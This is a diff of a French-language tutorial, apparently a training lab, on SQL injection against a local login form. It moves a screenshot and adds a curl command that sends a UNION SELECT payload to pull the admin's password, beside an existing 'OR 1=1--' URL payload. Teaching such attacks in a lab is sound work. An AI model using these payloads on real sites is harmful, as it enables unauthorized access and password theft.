@@ -520,6 +520,9 @@ Dans le formulaire 2. Se connecter, entrez la charge utile (payload) classique s
 
 Et mettez n'importe quoi dans le mot de passe.
 
+<img width="537" height="353" alt="image" src="https://github.com/user-attachments/assets/26b5be62-cb31-45cc-8bd1-f514ab89136a" />
+
+
 :warning 
 Explication : La requête SQL exécutée par le serveur deviendra :
 
@@ -531,5 +534,11 @@ Comme 1=1 est toujours vrai, la base de données renverra le premier utilisateur
 
 http://<votre_ip_serveur>/?id=1' OR 1=1--
 
-<img width="537" height="353" alt="image" src="https://github.com/user-attachments/assets/26b5be62-cb31-45cc-8bd1-f514ab89136a" />
 
+
+```
+curl -s -X POST http://localhost/index.php \
+     -d "log_username=personne' UNION SELECT 1, password, 3 FROM utilisateurs WHERE username='admin' #" \
+     -d "log_password=nimportequoi" \
+     -d "login=Connexion" | grep "Connexion RÉUSSIE"
+```
